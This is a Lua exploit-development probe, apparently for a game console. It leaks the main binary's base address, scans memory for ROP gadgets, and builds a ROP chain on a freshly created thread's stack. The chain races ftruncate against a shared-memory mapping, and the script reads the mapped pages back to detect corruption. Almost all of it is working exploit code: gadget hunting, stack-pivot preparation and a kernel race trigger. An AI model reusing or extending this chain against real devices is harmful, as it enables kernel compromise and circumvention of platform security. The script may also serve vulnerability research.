-- CRASH_CLASS: HIGH
-- PROBE 1106a: SHM race with TINY chain (3 iterations only)
--
-- Binary output appeared with 200-iter chains in 1102-1105.
-- Test if a 3-iter chain produces clean output and a working child.
-- Also: search for pop_rsp gadget for self-looping chain.

print("=== PROBE 1106a: SHM RACE TINY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l
    if type(val) == "table" and val.h then h = val.h; l = val.l
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end
local function wq2(a, lo, hi) wd(a, lo); wd(a + 4, hi or 0) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eoff(off)
    local lo = tlo + off; local hi = thi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

local fn_str = tostring(syscall.pipe):match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local fn_lo, fn_hi = 0, 0
if fn_str then
    local hs, ls = fn_str:match("^0x(%x+)(%x%x%x%x%x%x%x%x)$")
    if hs then fn_hi = tonumber(hs, 16) or 0; fn_lo = tonumber(ls, 16) or 0
    else fn_lo = tonumber(fn_str) or 0 end
end

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local mdr_lo, mdr_hi = eoff(0x92C67)
local jmp_lo, jmp_hi = eoff(0x42)
for off = 0, 0x100000, 2 do
    local b = rd(tlo + off)
    if b and (b % 0x10000) == 0xFEEB then
        jmp_lo, jmp_hi = eoff(off)
        break
    end
end

-- [A] Search for pop rsp; ret (5C C3) in eboot
print("[A] searching for pop_rsp_ret gadget...")
local pop_rsp_off = nil
for off = 0, 0x180000 do
    local b = rd(tlo + off)
    if b then
        local lo16 = b % 0x10000
        if lo16 == 0xC35C then
            pop_rsp_off = off
            print(string.format("  pop_rsp_ret at eboot+0x%X", off))
            break
        end
        -- Also check byte-shifted: xx 5C C3 xx
        local b1 = math.floor(b / 256) % 256
        local b2 = math.floor(b / 65536) % 256
        if b1 == 0x5C and b2 == 0xC3 then
            pop_rsp_off = off + 1
            print(string.format("  pop_rsp_ret at eboot+0x%X (mid-instruction)", off + 1))
            break
        end
    end
end
if not pop_rsp_off then print("  not found in first 1.5MB") end

local sc477 = mk(477)
local sc480 = mk(480)
local sc482 = mk(482)

local LARGE = 0x40000
local SMALL = 0x4000

-- SHM
local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)

N(sc480(uint64(shm_fd), uint64(LARGE)))
local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
local map_n = N(map)
print("map=" .. fmt(map))

for p = 0, 15 do
    wd(map_n + p * 0x4000, 0xAA000000 + p)
    wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
end

-- Stack
local ALLOC = 0x200000
local SSIZE = 0x100000
local stack = sc477(uint64(0), uint64(ALLOC), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local stack_n = N(stack)

-- TCB
local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_lo, tcb_hi = split(tcb)
wq2(tcb_n, tcb_lo, tcb_hi)
local fsb = memory.alloc(8)
local fsb_n = N(fsb)
wq2(fsb_n, tcb_lo, tcb_hi)

local done_flag = memory.alloc(8)
local done_n = N(done_flag)
wq2(done_n, 0, 0)

local rsp = math.floor((stack_n + SSIZE) / 16) * 16 - 8
local pos = 0
local function put(lo, hi)
    wd(rsp + pos * 8, lo)
    wd(rsp + pos * 8 + 4, hi or 0)
    pos = pos + 1
end

-- [B] TINY chain: sysarch + 3 ftruncate pairs + done + spin
print("[B] writing tiny chain (3 iters)...")

put(165, 0)
put(pdr_lo, pdr_hi); put(129, 0)
put(psr_lo, psr_hi)
do local fl, fh = split(fsb_n); put(fl, fh) end
put(fn_lo, fn_hi); put(par_lo, par_hi)

for i = 1, 3 do
    put(480, 0); put(pdr_lo, pdr_hi); put(shm_fd, 0)
    put(psr_lo, psr_hi); put(SMALL, 0); put(fn_lo, fn_hi); put(par_lo, par_hi)
    put(480, 0); put(pdr_lo, pdr_hi); put(shm_fd, 0)
    put(psr_lo, psr_hi); put(LARGE, 0); put(fn_lo, fn_hi); put(par_lo, par_hi)
end

put(0xDEAD1106, 0)
put(pdr_lo, pdr_hi)
do local dl, dh = split(done_n); put(dl, dh) end
put(mdr_lo, mdr_hi)
put(jmp_lo, jmp_hi)

print(string.format("chain: %d entries", pos))

-- thr_param
local tid_ptr = memory.alloc(8)
local tid_n = N(tid_ptr)
wq2(tid_n, 0, 0)

local param = memory.alloc(0x40)
local pm = N(param)
for i = 0, 0x3C, 4 do wd(pm + i, 0) end
wq2(pm, par_lo, par_hi)
do local sl, sh = split(stack); wq2(pm + 0x10, sl, sh) end
wq2(pm + 0x18, SSIZE, 0)
do local tl, th = split(tid_n); wq2(pm + 0x30, tl, th) end

print("launching...")
local ok1, ret1 = pcall(function()
    return mk(455)(uint64(pm), uint64(0x38))
end)
local rv = ok1 and N(ret1) or -999
print("thr_new=" .. rv)

if rv ~= 0 then
    print("FAILED alive=" .. tostring(alive()))
    return
end

local x = 0; for k = 1, 10000 do x = x + k end
print("tid=" .. (rd(tid_n) or "nil"))
print("done_flag=" .. string.format("0x%X", rd(done_n) or 0))

-- [C] Read pages after child finished
print("")
print("[C] reading pages")
for pg = 0, 15 do
    local ok2, val = pcall(function()
        return memory.read_qword(uint64(map_n + pg * 0x4000))
    end)
    if ok2 and val then
        print(string.format("  page %d: %s", pg, fmt(val)))
    else
        print(string.format("  page %d: FAIL", pg))
    end
end

print("")
print("alive=" .. tostring(alive()))
print("=== PROBE 1106a COMPLETE ===")
